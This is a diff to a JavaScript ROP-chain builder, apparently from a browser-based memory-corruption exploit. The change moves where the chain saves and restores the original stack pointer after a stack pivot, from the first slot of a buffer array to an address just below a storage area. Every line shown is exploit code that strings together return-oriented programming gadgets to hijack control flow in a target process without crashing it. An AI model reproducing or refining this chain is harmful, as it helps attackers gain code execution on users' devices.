@@ -87,8 +87,7 @@ function RopChain() {
 
         // Code to restore the stack pointer
         this.add('pop rax')
-        var addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true);
-        this.add(addr)
+        this.add(this.store_rsp_addr)
         this.add('mov rax, qword ptr [rax]')
         this.add('pop rdi')
         addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true).add(4 * (this.rop_chain.length + 0x6 + 0x6));
@@ -113,13 +112,12 @@ function RopChain() {
 
     // Code to cleanup the modification done by by the stack pivot
     // and to store the original stack pointer
-    // The value is stored in the first element of the rop_buf array
-    // So do not put anything else there.
+    // We are going to store it right below the user storage address
+    this.store_rsp_addr = storage.initial_addr.sub(0x8)
     this.add('pop rcx')
     this.add(1)
     this.add('add dword ptr [rax - 0x77], ecx')
     this.add('pop rdi')
-    var addr = new dcodeIO.Long(cbuf[0x14], cbuf[0x15], true);
-    this.add(addr);
+    this.add(this.store_rsp_addr);
     this.add('mov qword ptr [rdi], rax')
 }
